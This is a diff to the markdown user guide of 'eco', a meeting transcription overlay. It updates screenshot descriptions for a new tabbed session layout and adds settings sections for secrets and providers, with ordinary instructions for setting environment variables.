@@ -17,7 +17,7 @@ If you are looking for a task rather than a screen, start at
 
 | what | how |
 |---|---|
-| the pictures under `img/`, `01`–`56` | `mise run shots`: writes them from the real overlay, offscreen |
+| the pictures under `img/`, `01`–`62` | `mise run shots`: writes them from the real overlay, offscreen |
 | checking they are still what the window draws | nothing does: there is no `shots:check` (see below) |
 | `img/eco.gif`, the icon | not a screen: drawn by `mise run readme:gif` from `packaging/eco.omapixel` |
 | the window on a real desktop, over a real call | no pictures: none were taken for this page |
@@ -198,15 +198,17 @@ nothing would be heard.` and offers AUDIO SETTINGS.
 **START** puts the window on the session. This is the window for as long as it
 lasts:
 
-![The live session at 720×720: the masthead "ECO / SPRINT PLANNING" with the language dropdown "EN · American English", the cost, details, settings and close buttons; a red capsule reading "00:01:15 RECORDING" with a small trace, PAUSE and END; a framed REPLY answer from google/gemini-2.5-flash, with send, translate, copy and remove buttons on its heading, "Answer: Priya approves it; I send her the form today. Why: she is Acme's IT contact for the export server, so nothing moves until she signs."; a NOTE card "Ask Priya for the VPN account before Friday."; then YOU lines in faint boxes on the right and THEM lines in tinted boxes on the left; the skill chips "1 REPLY", "2 MINUTES", "3 EXPLAIN"; and the composer "Ask about the session, or /skill" with NOTE and SEND.](img/05-live.png)
+![The live session at 720×720: the masthead "ECO / SPRINT PLANNING" with the settings and close buttons; a red capsule reading "00:01:10 RECORDING" with a small trace, PAUSE and END; the tabs 01 CONVERSATION (lit), 02 PEOPLE, 03 SESSION and 04 COST; the dropdowns "EN · American English" and "TRANSLATION: OFF"; a framed REPLY answer from google/gemini-2.5-flash, with send, translate, copy and remove buttons on its heading, "Answer: Priya approves it; I send her the form today. Why: she is Acme's IT contact for the export server, so nothing moves until she signs."; a NOTE card "Ask Priya for the VPN account before Friday."; then YOU lines in faint boxes on the right and THEM lines in tinted boxes on the left; the skill chips "1 REPLY", "2 MINUTES", "3 EXPLAIN"; and the composer "Ask about the session, or /skill" with NOTE and SEND.](img/05-live.png)
 
 From the top:
 
 - **The masthead** carries the session's title (a session without one is named
-  by its kind), the language it is transcribed in — switchable mid-session —,
-  the cost button `$` (section 8), the details button `⋯` (section 6),
-  settings, and close. **Close goes back to
+  by its kind), settings, and close. **Close goes back to
   SESSIONS; a live session keeps recording.**
+- **The tabs** switch between the conversation, who takes part (section 6),
+  the session's details (section 6) and its cost (section 8). The conversation
+  has the language it is transcribed in — switchable mid-session — and the
+  translation menu.
 - **The capsule** is one line: the running time (stopped while paused), the
   state with a dot that keeps sending out a ring while it records, the trace of
   every input, PAUSE and END. Clicking the state pauses or resumes. END fills
@@ -272,11 +274,9 @@ becomes RESUME. END asks first:
 On a short window — the picture is 420×480 — the capsule joins the masthead
 and the skill chips go (`Alt+1…9` still run them):
 
-![The live session at 420×480: the masthead "SPRINT …" with the capsule inside it — a red dot, "00:01:17", pause and end as icons — and the details, settings and close buttons; the last four lines of the conversation; and the composer "Ask, or /skill" with the note and send buttons as icons.](img/10-live-short.png)
+![The live session at 420×480: the masthead "SPRINT …" with the capsule inside it — a red dot, "00:01:17", pause and end as icons — and the settings and close buttons; the last four lines of the conversation; and the composer "Ask, or /skill" with the note and send buttons as icons.](img/10-live-short.png)
 
-Under 560 px wide the capsule keeps icons only, and the language picker and
-COST move into the details — the masthead has no room for them, so the picture
-has no `$`; under 560 px tall the margins tighten and the skill chips
+Under 560 px wide the capsule keeps icons only; under 560 px tall the margins tighten and the skill chips
 hide. The window goes down to 240×320.
 
 **When a source's transcription is down**, a line under the capsule says so
@@ -312,7 +312,7 @@ provider went down to take it.
 | composer | `/` | list the skills: `↑` `↓` choose, `Tab` completes, `Enter` runs |
 | composer | `Alt+1…9` | run the skill with that number |
 | session | `E` | edit title and kind |
-| anywhere | `Esc` | close what is open: a menu, a dialog, the details, then the session |
+| anywhere | `Esc` | close what is open: a menu, a dialog, the tab, then the session |
 
 # 4. Finding it again
 
@@ -403,48 +403,45 @@ Each person keeps their colour across sessions; a speaker nobody has named
 
 # 6. What a session is: the details
 
-`⋯` in the masthead opens the details over the top of the conversation:
+A session has four tabs under its first line: CONVERSATION, PEOPLE, SESSION
+and COST. `Esc` goes back to the conversation, and from there to the sessions
+list. SESSION holds the details:
 
-![The details panel of Acme onboarding kickoff: "ENDED · 10 MAR 2025 14:00 · 00:34:54 · 10 LINES · 2 ANSWERS · 1 NOTE" with the edit and close buttons; the path "/tmp/eco-shots/.local/share/eco/sessions/2025-03-10-140000-acme-onboarding-kickoff.jsonl" and COPY PATH; PEOPLE "Ana Ribeiro, Marcus Lee, Priya Shah" with a + button; SPEAKERS — Speaker 1 → Ana Ribeiro (CLEAR, CHANGE), Me (you) → No one yet (CHANGE), Speaker 2 → Marcus Lee (CLEAR, CHANGE), Speaker 3 → No one yet (CHANGE); TAGS "#Acme ×" "#Q2 ×" and "Add a tag"; CONTEXT with an unlit "resume" chip; "TRANSLATION: OFF"; and COPY VTT and, in red, DELETE.](img/20-session-details.png)
+![The SESSION tab of Acme onboarding kickoff: "ENDED · 10 MAR 2025 14:00 · 00:34:54 · 10 LINES · 2 ANSWERS · 1 NOTE" with the edit button; the path "/tmp/eco-shots/.local/share/eco/sessions/2025-03-10-140000-acme-onboarding-kickoff.jsonl" and COPY PATH; TAGS "#Acme ×" "#Q2 ×" and a field "Add a tag" with ADD; CONTEXT with an unlit "resume" chip; and COPY VTT and, in red, DELETE.](img/20-session-details.png)
 
-Top to bottom: what the session is, in two lines at most, with the edit button
-(title and kind; `E`) and the close button, an up chevron; where its log is, for a stored
-session; the people in it; who each speaker is; its tags; which context slots
-it sends; whether it translates; and COPY VTT (the transcript as WebVTT, to the
-clipboard) and DELETE. A live session's DELETE is off. The first line, with its
-two buttons, stays at the top while the rest scrolls under it, a rule marking
-the edge once it does. The close button shuts the panel as `Esc` and `⋯` do. On
-a short, narrow live window, where the masthead has no room for it, COST is
-here too, before COPY VTT.
+Top to bottom: what the session is, with the edit button (title and kind;
+`E`); where its log is, for a stored session; its tags; which context slots it
+sends; and COPY VTT (the transcript as WebVTT, to the clipboard) and DELETE. A
+live session's DELETE is off. The conversation tab holds the translation menu.
 
 **The edit button** opens `edit session`, the title and the kind:
 
-![The EDIT SESSION dialog over the dimmed details: TITLE "Acme onboarding kickoff", KIND "Meeting", CANCEL and SAVE.](img/21-session-edit.png)
+![The EDIT SESSION dialog over the dimmed SESSION tab: TITLE "Acme onboarding kickoff", KIND "Meeting", CANCEL and SAVE.](img/21-session-edit.png)
 
-**PEOPLE `+`** opens the people dialog: those who are in the session because a
-speaker is them (FROM SPEAKERS, and off, with the reason on hover), and under
-ADD SOMEONE those added by hand — Priya Shah here — and everyone else known:
+**PEOPLE** lists who is in the session: those who are in it because a speaker
+is them (dimmed, with the reason on hover), those added by hand — Priya Shah
+here, with ×, which removes them — and, under the field, everyone else known.
+Under them SPEAKERS says who each speaker is (see 7):
 
-![The PEOPLE IN THIS SESSION dialog: FROM SPEAKERS with Ana Ribeiro and Marcus Lee as dimmed chips; ADD SOMEONE with a field "Add a person by name" and ADD, then chips for Priya Shah (lit, with ×), Chen Wei, Jonas Weber, M. Lee and Sofia Alvarez; CLOSE.](img/22-session-people.png)
+![The PEOPLE tab: PEOPLE with Ana Ribeiro and Marcus Lee as dimmed chips, a field "Add a person by name" with ADD, then chips for Priya Shah (lit, with ×), Chen Wei, Jonas Weber, M. Lee and Sofia Alvarez; SPEAKERS with Speaker 1 → Ana Ribeiro (CLEAR, CHANGE), Me (you) → No one yet (CHANGE), Speaker 2 → Marcus Lee (CLEAR, CHANGE) and Speaker 3 → No one yet (CHANGE).](img/22-session-people.png)
 
 **DELETE** asks `Delete <title>?` and says the transcript, answers and voice
 links go for good:
 
 ![The DELETE SESSION dialog in a red frame: "Delete Acme onboarding kickoff?" and, in red, "The transcript, answers and voice links will be permanently removed.", with CANCEL and, filled red, DELETE.](img/23-session-delete.png)
 
-**When eco recognises a voice**, the session says so on one line, and REVIEW
-opens the details at the speakers:
+**When eco recognises a voice**, a dot lights on the PEOPLE tab and the
+conversation says so on one line, with REVIEW, which opens PEOPLE:
 
-![The imported session "RUST MEETUP: ASYNC IN PRACTICE": the line "OTHER · 27 FEB 2025 18:00 · 00:52:00 · 3 LINES · IMPORTED"; a line "1 VOICE GUESS" with REVIEW; the details open, SPEAKERS saying "eco guessed these speakers from their voices. Nothing changes until you confirm.", Speaker 1 → No one yet, and Speaker 2 → "Jonas Weber? · 93%" with CONFIRM lit, CLEAR and CHANGE.](img/24-session-guess.png)
+![The imported session "RUST MEETUP: ASYNC IN PRACTICE": the line "OTHER · 27 FEB 2025 18:00 · 00:52:00 · 3 LINES · IMPORTED"; the tabs with a red dot after PEOPLE; the PEOPLE tab open, SPEAKERS saying "eco guessed these speakers from their voices. Nothing changes until you confirm.", Speaker 1 → No one yet, and Speaker 2 → "Jonas Weber? · 93%" with CONFIRM lit, CLEAR and CHANGE.](img/24-session-guess.png)
 
 The guess is never applied on its own: the speaker's lines read `JONAS WEBER?`
-until CONFIRM, and CLEAR drops it. On a short window the count moves onto the
-details button.
+until CONFIRM, and CLEAR drops it.
 
 **TRANSLATION** picks a language for this session only — any of the seventeen eco
 knows but the session's own:
 
-![The details of Acme onboarding kickoff with the TRANSLATION menu open over them: OFF marked, then PT · português, ES · español de España, FR · français, DE · Deutsch, IT · italiano, NL · Nederlands, PL · polski, RU · русский, UK · українська, TR · Türkçe, cut at the window's edge.](img/25-session-translation.png)
+![The conversation of Acme onboarding kickoff with the TRANSLATION menu open over it: OFF marked, then PT · português, ES · español de España, FR · français, DE · Deutsch, IT · italiano, NL · Nederlands, PL · polski, RU · русский, UK · українська, TR · Türkçe, cut at the window's edge.](img/25-session-translation.png)
 
 From then on every line and answer carries its translation under it:
 
@@ -463,11 +460,11 @@ saying that no chat model answers there.
 
 # 7. Who is who
 
-The SPEAKERS list of the details is the one place in the window that says who
+The SPEAKERS list of the PEOPLE tab is the one place in the window that says who
 each speaker is. CHANGE on a speaker, or clicking a speaker's name in the
 conversation (`N` on a line), asks:
 
-![The "assign person" dialog over the details: APPLY TO with THIS SPEAKER lit and, in orange, "2 lines will change"; WHO THIS IS with "Tom Becker" typed; a SPEAKER COLOR swatch; KNOWN PEOPLE chips — Ana Ribeiro, Chen Wei, Jonas Weber, M. Lee, Marcus Lee, Priya Shah, Sofia Alvarez; CANCEL and SAVE.](img/27-session-speaker.png)
+![The "assign person" dialog over the PEOPLE tab: APPLY TO with THIS SPEAKER lit and, in orange, "2 lines will change"; WHO THIS IS with "Tom Becker" typed; a SPEAKER COLOR swatch; KNOWN PEOPLE chips — Ana Ribeiro, Chen Wei, Jonas Weber, M. Lee, Marcus Lee, Priya Shah, Sofia Alvarez; CANCEL and SAVE.](img/27-session-speaker.png)
 
 It offers the people the voice suggests first, with their score when the
 session kept one, then everyone known, then a new name. It says how many lines
@@ -479,11 +476,10 @@ has warns and offers to merge the two. **A person id is never on screen.**
 
 # 8. What it cost
 
-**COST** at the top of the session (the `$` button in the masthead); on a
-short, narrow live window, where the masthead has no room for it, it is in the
-details instead:
+**COST** is the last tab of a session. It asks what the session cost when
+chosen:
 
-![The cost screen: masthead "ECO / COST · ACME ONBOARDING KICKOFF", a SESSION back button and "TOTAL US$ 0.27"; "LLM US$ 0.00068 answers US$ 0.00068" and "TRANSCRIPTION US$ 0.27 (35 MIN)"; then three rows: "Transcription · 35 min, 14:34 · deepgram, US$ 0.27"; "Answer · What did we agree on the deadline?, 14:02 · google/gemini-2.5-flash, US$ 0.00027"; "Answer · reply, 14:00 · google/gemini-2.5-flash, US$ 0.00041".](img/28-session-cost.png)
+![The COST tab: "TOTAL US$ 0.27"; "LLM US$ 0.00068 answers US$ 0.00068" and "TRANSCRIPTION US$ 0.27 (35 MIN)"; then three rows: "Transcription · 35 min, 14:34 · deepgram, US$ 0.27"; "Answer · What did we agree on the deadline?, 14:02 · google/gemini-2.5-flash, US$ 0.00027"; "Answer · reply, 14:00 · google/gemini-2.5-flash, US$ 0.00041".](img/28-session-cost.png)
 
 The total, the LLM part split into answers, reviews and translations, and the
 transcription with its minutes; then every charge, what it was for, when, which
@@ -494,12 +490,12 @@ marked `≈`:
 
 ![The cost screen of "Northwind backend interview": "TOTAL ≥ US$ 0.35"; "LLM US$ ? answers US$ ?" and "TRANSCRIPTION US$ 0.35 (45 MIN)"; in amber, "A provider reported no cost for some calls."; "≈ estimated at the price per minute you set for the model."; then "Transcription · 45 min, 09:45 · deepgram, ≈ US$ 0.35" and "Answer · reply, 09:00 · google/gemini-2.5-flash, ? not reported" in amber.](img/29-session-cost-unknown.png)
 
-On a live session the screen follows the spending while open. SESSION or `Esc`
+On a live session the screen follows the spending while open. CONVERSATION or `Esc`
 goes back.
 
 **Cost is shown only when asked for inside a session.** The sessions list, the
-answer cards and the masthead never carry an amount: the `$` button only opens
-this screen.
+answer cards and the masthead never carry an amount: only the COST tab shows
+it.
 
 # 9. People
 
@@ -575,7 +571,7 @@ as in a live session (section 3):
 
 The dialog scrolls (arrows, `PgUp`, `PgDn`). Its end:
 
-![The keyboard shortcuts dialog scrolled to its end: QUESTION BOX (Enter, Shift+Enter, / with ↑ · ↓, Tab and Enter, Alt+1…9), MENUS AND OPTION LISTS (↑ · ↓ · Home · End, Enter · Space, Esc) and SETTINGS (1…8 · Ctrl+1…8 switch tab, Ctrl+Tab · Ctrl+Shift+Tab over two lines, next · previous tab, ↑ · ↓ · Home · End and Enter · Space on the rail, ↑ · ↓ pick a row, Enter · Space open the item picked, Delete delete the item picked, Enter and Delete in a table inside an item, Ctrl+E edit the item picked or open, Enter · Space on a row with a value open its list, turn its switch, or write its name or number, Ctrl+S save, Esc back one level, then close).](img/38-shortcuts-end.png)
+![The keyboard shortcuts dialog scrolled to its end: QUESTION BOX (Enter, Shift+Enter, / with ↑ · ↓, Tab and Enter, Alt+1…9), MENUS AND OPTION LISTS (↑ · ↓ · Home · End, Enter · Space, Esc) and SETTINGS (1…9 · 0 · Ctrl+1…9 · Ctrl+0 over two lines, choose section 1–10 with 0 the tenth, Ctrl+Tab · Ctrl+Shift+Tab over two lines, next · previous section round the ends, ↑ · ↓ · Home · End move along the sections on the rail, Enter · Space open the section the rail is on, ↑ · ↓ pick a row, Enter · Space open the item picked, Delete delete the item picked, Enter and Delete in a table inside an item, Ctrl+E edit the item picked or open, Enter · Space on a row with a value open its list, turn its switch, or write its name or number, Ctrl+S save, Esc back one level, then close).](img/38-shortcuts-end.png)
 
 The GLOBAL keys are not the window's: `packaging/hypr/eco.lua` binds them in
 Hyprland to `eco window` commands, and on Windows the daemon registers them
@@ -597,17 +593,18 @@ second window, `eco · settings` to Hyprland, 1040×760 or its screen less a
 every row). The window never writes the config itself: **each change is saved on
 its own**, and the daemon validates the whole config and writes it.
 
-Down the left are the nine sections, numbered from `01`, each named for the
-question it answers: AUDIO, MODELS, LANGUAGES, SESSION KINDS, PROMPTS, CONTEXT,
-SKILLS, GENERAL and APPEARANCE. The rail is a carousel: the one on screen at its head, in
-the accent, beside the bar, the others after it in order, the ones before it
-coming round after the last. Folded, it shows only their numbers; under the
+Down the left are the eleven sections, numbered from `01`, each named for the
+question it answers: AUDIO, SECRETS, PROVIDERS, MODELS, LANGUAGES, SESSION
+KINDS, PROMPTS, CONTEXT, SKILLS, GENERAL and APPEARANCE. The rail keeps this order: `01` at the top to `11` at the
+bottom, and the one on screen is lit in the accent. Folded, it shows only their numbers; under the
 pointer, with the keyboard on it, or after a tap on its head, it unfolds over
 the section with their names. `Tab` moves from the rail to the bar of commands
 and then into the section; on the rail, `↑`, `↓`, `Home` and `End` move along
-it and `Enter` or `Space` opens the section. A section's number opens it,
-unless you are writing in a field, which keeps the digit; `Ctrl` with the
-number opens it anywhere in the window. The bar holds BACK first, then the main
+it, stopping at the ends, and `Enter` or `Space` opens the section. A section's digit opens it (`1` to `9`,
+and `0` for the tenth), unless you are writing in a field, which keeps the
+digit; `Ctrl` with the digit opens it anywhere in the window. `Ctrl+Tab` and
+`Ctrl+Shift+Tab` go to the next and the previous section, round the ends, and
+reach APPEARANCE, the eleventh. The bar holds BACK first, then the main
 action, solid, on the left, and the other actions on the right, DELETE or
 DISCARD last, behind a thin rule. `×` in the top-right corner closes the
 window; its messages are toasts in the bottom-right corner (section 1).
@@ -623,7 +620,7 @@ There are two kinds of row:
   saves and `Esc` puts the value back. `Tab` reaches the control. A save the
   daemon refuses leaves the value as it was, and an error toast says why.
   AUDIO and GENERAL are made of these.
-- **An item with content** — a model, a session kind, a prompt, a context, a
+- **An item with content** — a secret, a provider, a model, a session kind, a prompt, a context, a
   skill — **opens on a screen of its own**. A double click, or `Enter` or
   `Space` on the picked row, opens it. The bar holds ADD (the section's own name
   for it, such as ADD MODEL), then VIEW, EDIT, what else the section does, and
@@ -658,7 +655,7 @@ nothing.
 
 | where | key | what it does |
 |---|---|---|
-| outside a field being written | `1` … `9` | show that section |
+| outside a field being written | `1` … `9` | show that section, of the first nine |
 | anywhere | `Ctrl+1` … `Ctrl+9` | show that section |
 | anywhere | `Ctrl+Tab`, `Ctrl+Shift+Tab` | the next, the previous section |
 | the rail | `↑` `↓` `Home` `End` | move along the sections |
@@ -705,60 +702,96 @@ DELETE deletes the picked source after asking, saying which
 devices are no longer heard, whether no output is left, and whether nobody is
 you any more. Dropping echoes and echo cancellation are under General.
 
-**Models** — every model, registered once, and the defaults:
+**Secrets** — where each key comes from. A secret is a name and a reference:
+an environment variable, an omapass account or, on Windows, a Credential
+Manager name. It is never the key: eco does not create, store or show one.
 
-![Settings, 02 MODELS: the bar with ADD MODEL, VIEW, EDIT, the defaults by their short names, a dimmed FOR CHAT, a dimmed FOR TRANSLATION and FOR REVIEW, and a dimmed DELETE; "Register each model once — chat or transcription — with its provider, and make it a default from the bar…"; a table NAME · TYPE · MODEL ID · DEFAULT · USED BY: whisper-lan (TRANSCRIPTION · whisper-large-v3-turbo · TRANSCRIPTION · MEETING, CONVERSATION…), deepgram (TRANSCRIPTION · nova-3 · · INTERVIEW), gemini-flash (CHAT · google/gemini-2.5-flash · CHAT · TRANSLATION · MEETING, CONVERSATION…, picked), claude-haiku (CHAT · anthropic/claude-haiku-4.5 · REVIEW · minutes).](img/41-settings-models.png)
+![Settings, 02 SECRETS: the bar with ADD SECRET, VIEW, EDIT, CHECK and a dimmed DELETE; "Where each key comes from…"; a table NAME · SOURCE · REFERENCE · STATE with DEEPGRAM_API_KEY and OPENROUTER_API_KEY (picked), each ENVIRONMENT and "resolves, a key is read" — entries like any other, edited or deleted from the bar.](img/41-settings-secrets.png)
 
-DEFAULT says what the model runs when nothing more specific picks one: CHAT
-(questions, and the skills and session kinds that pick no model), TRANSLATION,
-REVIEW (the reviewer's pass, when answers are reviewed) and TRANSCRIPTION.
-With no translation default of its own, translation follows the chat default,
-and that model reads CHAT · TRANSLATION (INHERITED). With a chat model picked,
-the bar holds DEFAULT FOR CHAT, DEFAULT FOR TRANSLATION and DEFAULT FOR
-REVIEW; with a transcription model, DEFAULT FOR TRANSCRIPTION; with none, a
-dimmed DEFAULT FOR CHAT; where the bar has no room for those names, as in
-the picture, they read FOR CHAT, FOR TRANSLATION and FOR REVIEW. Each saves
-at once, and is dimmed on the model that is already that default, with why in
-its hint. DEFAULT FOR REVIEW only picks the
-reviewer's model: whether answers are reviewed is turned on under General.
-USED BY lists what else picks the model: skills and session kinds. The chat
-and transcription defaults cannot be deleted, so DELETE is dimmed on them;
-deleting another says what falls back to which model. Opened, a model shows its
-facts, what it is the default for among them, and under RELATED what else uses
-it:
+STATE tells whether the daemon reads a key from the reference now: "resolves,
+a key is read", or why not (the variable is not set, omapass is missing or
+locked, the credential is not there). Only that crosses to the window, never
+the key. CHECK reads every secret again, for omapass and the Credential
+Manager can change while eco runs; a variable cannot, since the daemon reads
+its environment once, when it starts. The secrets eco ships — OPENROUTER,
+ELEVENLABS, DEEPGRAM and GROQ, each satisfied by setting its variable — are
+added to the config when eco first runs and are rows like any other: edit or
+delete them. A secret a provider uses is not deleted: DELETE is dimmed, with
+the providers in its hint.
 
-![The model gemini-flash, read: the bar with BACK, EDIT and a dimmed DELETE; ABOUT with TYPE CHAT, DEFAULT FOR CHAT · TRANSLATION, PROVIDER OPENROUTER, BASE URL https://openrouter.ai/api/v1, MODEL ID google/gemini-2.5-flash, KEY FROM env OPENROUTER_API_KEY, REASONING OFF; RELATED with SESSION KINDS · ASSISTANT + TRANSLATION › MEETING, CONVERSATION, OTHER, IDEA, INTERVIEW.](img/42-settings-model.png)
+![The secret OPENROUTER_API_KEY, read: the bar with BACK, EDIT and a dimmed DELETE; ABOUT with SOURCE ENVIRONMENT, REFERENCE OPENROUTER_API_KEY, STATE "resolves, a key is read"; RELATED with PROVIDERS › openrouter.](img/42-settings-secret.png)
+
+Edited, a secret has its name, which the providers that use it follow, its
+source and its reference. **PICK A KEY** beside the reference opens one list of
+the names the daemon can read, never their values, under a title per source:
+ENVIRONMENT (variables named `ECO_<NAME>`, a placeholder, and the provider
+variables eco knows that are set), then OMAPASS on Linux and macOS when omapass
+is installed, or CREDENTIAL MANAGER on Windows (the generic credentials
+`eco:<name>`). Each source ends with **TYPE A NAME…**, which keeps that source
+and gives the keyboard to the field, for a name the list does not show. Picking
+a name sets it and clears the other sources. Without omapass on the machine, an
+info button beside the picker opens omapass's install page. Beside an
+environment variable, a line says how to set it so the daemon sees it, on the
+system eco runs on:
+
+- Linux: the daemon is a systemd user service, so an `export` in a shell does
+  not reach it; add the line `NAME=value` to `~/.config/environment.d/eco.conf`
+  (kept across logins). To use it now, run
+  `systemctl --user set-environment NAME=value`, then `eco restart`.
+- Windows: run `setx NAME "value"` in a terminal, then restart eco.
+- macOS: run `launchctl setenv NAME "value"` in a terminal, then restart eco.
+
+A second line offers the alternative: the key in omapass, or in the Credential
+Manager with `eco key set <name>`. The pictures are made on Linux, so none shows
+the Credential Manager. Here the picker is open, nothing picked from it:
+
+![The secret OPENROUTER_API_KEY being edited, EDITING beside SECRET, the bar with a dimmed SAVE and CANCEL: NAME "OPENROUTER_API_KEY"; SOURCE with ENVIRONMENT lit; REFERENCE "OPENROUTER_API_KEY" with PICK A KEY open below it: ENVIRONMENT with DEEPGRAM_API_KEY, ECO_LAN_KEY, OPENROUTER_API_KEY (chosen) and TYPE A NAME…; under the field the Linux line on environment.d and eco restart, the line on omapass, and the line on eco restart for a new variable.](img/43-settings-secret-edit.png)
+
+**Providers** — the services models are served by: a name, a base URL and the
+secret its requests carry, picked from the Secrets section, or none for a
+server on your network.
+
+![Settings, 03 PROVIDERS: the bar with ADD PROVIDER, VIEW, EDIT and a dimmed DELETE; a table NAME · BASE URL · SECRET · USED BY with 192.0.2.10 (none, whisper-lan), deepgram, openrouter (picked; gemini-flash, claude-haiku).](img/44-settings-providers.png)
+
+The providers eco ships — OpenRouter, ElevenLabs, Deepgram and Groq, each with
+its secret of the same name — are added when eco first runs and are rows like
+any other. A provider a model uses is not deleted.
+
+![The provider openrouter, read: the bar with BACK, EDIT and a dimmed DELETE; ABOUT with BASE URL https://openrouter.ai/api/v1 and SECRET OPENROUTER_API_KEY · resolves, a key is read; RELATED with SECRETS › OPENROUTER_API_KEY and MODELS › gemini-flash, claude-haiku.](img/45-settings-provider.png)
+
+Edited, a provider has its name, which the models that use it follow, its base
+URL (an OpenAI-compatible endpoint, or for transcription a streaming `wss://`
+one) and its secret, a chip per secret and one for none.
+
+**Models** — every model, registered once, and the defaults. A model is a
+name, a type, a provider picked from the Providers section and the id that
+provider knows it by; this section registers models and nothing else.
+
+![Settings, 04 MODELS: the bar with ADD MODEL, VIEW, EDIT, the defaults by their short names, a dimmed FOR CHAT, a dimmed FOR TRANSLATION and FOR REVIEW, and a dimmed DELETE; "Register each model once — chat or transcription — with a provider from the Providers tab…"; a table NAME · TYPE · MODEL ID · DEFAULT · USED BY · STATE: whisper-lan (TRANSCRIPTION · whisper-large-v3-turbo · TRANSCRIPTION · MEETING, CONVERSATION…), deepgram (TRANSCRIPTION · nova-3 · · INTERVIEW), gemini-flash (CHAT · google/gemini-2.5-flash · CHAT · TRANSLATION · MEETING, CONVERSATION…, picked), claude-haiku (CHAT · anthropic/claude-haiku-4.5 · REVIEW · minutes); STATE is empty, for every key is set.](img/46-settings-models.png)
+
+The models eco ships — `gpt-6-luna`, `scribe-v2`, `nova-3` and
+`whisper-turbo` — are added when eco first runs and are rows like any other. A
+model whose key is not set stays in the list, dim, with STATE "disabled"; it
+cannot be made a default or tested, the reason the daemon gave (`gpt-6-luna`
+needs `OPENROUTER_API_KEY`) being the hint of the dimmed command.
+
+![The model gemini-flash, read: the bar with BACK, EDIT and a dimmed DELETE; ABOUT with TYPE CHAT, DEFAULT FOR CHAT · TRANSLATION, PROVIDER openrouter, MODEL ID google/gemini-2.5-flash, REASONING OFF; RELATED with SESSION KINDS · ASSISTANT + TRANSLATION › MEETING, CONVERSATION, OTHER, IDEA, INTERVIEW.](img/47-settings-model.png)
 
 Edited, it has its type while nothing uses it, its name, the reasoning for a
-chat model, the provider (CUSTOM takes any base URL), the model (LIST shows the
-models the provider offers), where the key comes from, the price per minute of
-a transcription model and, for a chat model, EXTRA (JSON), the extra fields
-sent with each request.
+chat model, the provider (a chip per provider), the
+model id (LIST shows the models the saved provider offers, with its own secret;
+an unsaved provider is asked to be saved first), the price per minute of a
+transcription model and, for a chat model, EXTRA (JSON), the extra fields sent
+with each request. Where its key comes from is the provider's secret, set in
+the Secrets section.
 
-**KEY FROM** names the source above a field holding the key's name. **PICK A
-KEY** beside it opens one list of the names the daemon can read, never their
-values, under a title per source: ENVIRONMENT (variables named `ECO_<NAME>`, a
-placeholder, and the provider variables eco knows that are set), then
-OMAPASS on Linux when omapass is installed, or CREDENTIAL MANAGER on Windows
-(the generic credentials `eco:<name>`). Each source ends with **TYPE A NAME…**,
-which keeps that source and gives the keyboard to the field, for a name the
-list does not show. The list is asked for each time it opens; a line under the
-field says a new variable shows only after `eco restart`, because the daemon
-reads its environment when it starts, and on Windows that a new credential
-shows at once. Picking a name sets it and clears the other sources. Without
-omapass on the machine, as in these pictures, OMAPASS is not listed and an info
-button beside the picker opens omapass's install page. With a credential named,
-a line says how to store that key with `eco key set <name>` or as the generic
-credential `eco:<name>`. The pictures are made on Linux, so none shows the
-Credential Manager. Here the picker is open, nothing picked from it:
-
-![The model gemini-flash being edited, EDITING beside MODEL, the bar with a dimmed SAVE and CANCEL: NAME "gemini-flash"; REASONING with PROVIDER'S, OFF (lit), LOW, MEDIUM, HIGH; PROVIDER with OPENROUTER (lit), GROQ, CUSTOM; MODEL "google/gemini-2.5-flash" with LIST; KEY FROM · ENVIRONMENT with "OPENROUTER_API_KEY", an info button and PICK A KEY open below it: ENVIRONMENT with DEEPGRAM_API_KEY, ECO_LAN_KEY, OPENROUTER_API_KEY (chosen) and TYPE A NAME…; the line on eco restart under the field; EXTRA (JSON) holding "{}".](img/43-settings-model-edit.png)
+![The model gemini-flash being edited, EDITING beside MODEL, the bar with a dimmed SAVE and CANCEL: NAME "gemini-flash"; REASONING with PROVIDER'S, OFF (lit), LOW, MEDIUM, HIGH; PROVIDER with 192.0.2.10, deepgram, openrouter (lit), OPENROUTER, ELEVENLABS, DEEPGRAM and GROQ, and a line saying to pick one from the Providers tab; MODEL "google/gemini-2.5-flash" with LIST; EXTRA (JSON) holding "{}".](img/48-settings-model-edit.png)
 
 Renaming a model renames it wherever it is used.
 
 **Languages** — the spoken languages a session may start in:
 
-![Settings, 03 LANGUAGES: the bar with ADD LANGUAGE, MAKE DEFAULT and DELETE; "The spoken languages a session can start in; the default is chosen first. The default transcription model is set on the Models table."; a table LANGUAGE · DEFAULT with AUTO · detect (picked), EN · American English (DEFAULT), ES · español de España and PT · português.](img/44-settings-languages.png)
+![Settings, 05 LANGUAGES: the bar with ADD LANGUAGE, MAKE DEFAULT and DELETE; "The spoken languages a session can start in; the default is chosen first. The default transcription model is set on the Models table."; a table LANGUAGE · DEFAULT with AUTO · detect (picked), EN · American English (DEFAULT), ES · español de España and PT · português.](img/50-settings-languages.png)
 
 A row per language, in the order the dropdowns show them, the order they were
 added in. A language has no screen of its own, so there is no VIEW or EDIT. ADD
@@ -772,14 +805,14 @@ deleted. The default transcription model is set on the Models table.
 
 **Session kinds** — the kinds, and what each runs on:
 
-![Settings, 04 SESSION KINDS: the bar with ADD KIND, VIEW, EDIT, a dimmed MAKE DEFAULT and DELETE; a sentence on the default kind and the kinds' own models; a table NAME · DEFAULT · TRANSCRIBES WITH · ANSWERS WITH: Meeting (DEFAULT · default · whisper-lan · default · gemini-flash, picked), Conversation, Other and Idea with the same defaults, interview (deepgram · default · gemini-flash).](img/45-settings-kinds.png)
+![Settings, 06 SESSION KINDS: the bar with ADD KIND, VIEW, EDIT, a dimmed MAKE DEFAULT and DELETE; a sentence on the default kind and the kinds' own models; a table NAME · DEFAULT · TRANSCRIBES WITH · ANSWERS WITH: Meeting (DEFAULT · default · whisper-lan · default · gemini-flash, picked), Conversation, Other and Idea with the same defaults, interview (deepgram · default · gemini-flash).](img/51-settings-kinds.png)
 
 The default kind is the one the start and import dialogs suggest; MAKE DEFAULT
 makes the picked kind it. Deleting a kind says its sessions keep it and the
 models and context slots chosen for it stop applying; the only kind left
 cannot be deleted. Opened:
 
-![The session kind Meeting, read: the bar with BACK, EDIT, a dimmed MAKE DEFAULT and DELETE; ABOUT with DEFAULT "Yes: suggested first when a session is created or imported", TRANSCRIPTION default · whisper-lan, ASSISTANT default · gemini-flash, TRANSLATION default · gemini-flash; RELATED with MODELS › whisper-lan, gemini-flash.](img/46-settings-kind.png)
